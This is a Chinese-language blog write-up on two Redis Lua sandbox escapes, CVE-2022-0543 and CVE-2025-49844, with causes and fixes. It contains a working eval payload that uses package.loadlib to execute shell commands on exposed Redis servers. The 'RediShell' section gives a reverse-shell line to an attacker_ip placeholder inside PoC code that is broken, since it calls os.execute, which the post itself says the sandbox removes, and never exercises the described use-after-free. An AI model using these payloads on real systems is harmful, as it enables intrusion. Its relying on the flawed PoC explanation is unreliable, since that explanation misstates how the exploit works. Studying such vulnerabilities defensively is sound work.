---
title: CEV漏洞分享
published: 2025-11-17T17:39:00.000+08:00
tags: []
category: 漏洞
draft: false
---


## CVE-2022-0543 Redis沙盒逃逸漏洞复现



* ###  漏洞成因：

   redis作为一个键值存储数据库，在西方小公司广泛被使用，而由于它下载默认为无密码，一旦开放外网连接，暴露在公网中时，就可以被直接连接到redis-cli终端



   \`redis-cli -h your_ip\`



   而redis终端采用lua VM作为输入的语言，lua（基于C语言开发的一种轻量级高效的脚本语言，往往有很多条命令做成一个单元进行执行），lua脚本在执行时的安全由lua沙箱负责



   lua沙箱如何确保脚本不会执行危害到系统的命令，它移除了以下所有可能访问外部系统资源的库和函数,只保留了纯计算型、不会与外部系统交互的安全库



>   `` `package 库：完全移除。这是最关键的一步，因为它包含了 loadlib，能够动态加载 C 扩展，是沙箱逃逸的最大威胁` ``
>
> ``
>
> ``   `io 库：完全移除。防止文件读写和执行系统命令（通过 popen）` ``
>
> ``
>
> ``   `os 库：完全移除。防止执行系统命令（如 os.execute）、删除文件等` ``
>
> ``
>
> ``   `debug 库：完全移除。防止其用于 introspection 和修改上值，从而绕过沙箱` ``
>
> ``
>
> ``   `loadfile / dofile：这些独立的函数也被移除，防止从文件系统加载额外的 Lua 代码` ``





 所以我们要执行危险的命令（例如：获取系统权限）就必须要绕开lua沙箱的限制，在本漏洞中由于早期版本的疏忽，开发者没有移除package变量，导致用户可以通过package.loadlib()导入自己所需要的库可以执行危险命令，从而逃离沙箱的限制

* ### 攻击脚本

```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); 
local io = io_l(); 
local f = io.popen("id", "r"); 
local res = f:read("*a"); f:close(); 
return res' 0
```



   我们将这部分代码进行分开讲解



   首先lua脚本使用eval进行写入，我们可以禁用这种类型的命令来避免被写入攻击脚本（有时可面临需要无法禁用）



   作为前文提到的package首先登场，它的作用为加载lua的官方库，使其可以支持使用外部库的命令

``   `local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");` ``



   我们使用io作为io库表，用其承接我们需要执行的命令，在io.open()中

``   `local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0` ``



   至此攻击脚本就结束，很简洁的攻击方式却能达到十分危险的效果

* ### 具体复现



   为了节省篇幅，具体复现一笔带过，如果需要查阅请前往<https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md>进行详细的了解。

* ### 漏洞修复

  漏洞可以从两方面进行修复：以非root权限运行redis、禁用package变量

  以非root权限运行redis时就可以避免绕过沙箱就拥有了root权限
* 禁用package变量就可以直接解决问题的根源




## CVE-2025-49844"RediShell"

![](/images/0f6f46ac-7649-4303-945b-538f29afe994.png)

* ### 漏洞成因

  这个漏洞在不久之前发出公告，也是可以实现远程代码执行的漏洞，具体原因与上面不同为UAF(use after free)

  首先我们了解GC：GC是一个垃圾回收器，往往在大量分配和释放内存时被触发，清除他认为没有用的空间，将其重新分配给其他部分。GC是如何判断一个程序是否还有用，lua中存在一个结构体：lua_state，这个结构体内包括栈、栈顶指针、调用桢（存储着运行所需要的一切环境）、寄存器。GC通过扫描这个栈，如果对象还在栈内存在引用，那么他会认为这个对象还有用，反之则必须清除

  \
  问题的根源在lua处理脚本名称时没有将创建的脚本立刻压入lua栈中，导致其没有GC根对象属性（即需要被清除），而这一举动会导致GC清除掉我们可能还在使用的空间，一旦这样做就会导致还存在引用的空间被分配给其他人使用，而我们的机会就到了，可以在这个内存写入恶意代码，当调用出现时，恶意代码就会被执行，系统就会出现问题

  下面是一个存在问题的源代码
* ### 攻击方式

  ```
  local malicious_name = "crafted_gc_trigger"
  -- 构造触发GC的内存操作序列
  for i=1,1000 do
      redis.call('SET', 'garbage_'..i, string.rep('A', 1024))
  end
  -- 触发垃圾回收，释放未锚定的TString对象
  collectgarbage()
  -- 利用UAF漏洞执行系统命令
  os.execute('bash -i >& /dev/tcp/attacker_ip/4444 0>&1')

  ```

  上述只是一个简化的攻击代码，在真实场景中往往需要更多的处理\
  首先我们做的是通过for循环大量分配内存，凭此触发GC，实现回收；然后我们收集回收的碎片在其中写入恶意代码，就只需要等待调用即可。
* ### 漏洞复现

  暂时还未复现成功
* ### 漏洞修复

  修复方法：在对象创建之后就立马锚定，可以避免被错误回收，可以禁用lua脚本
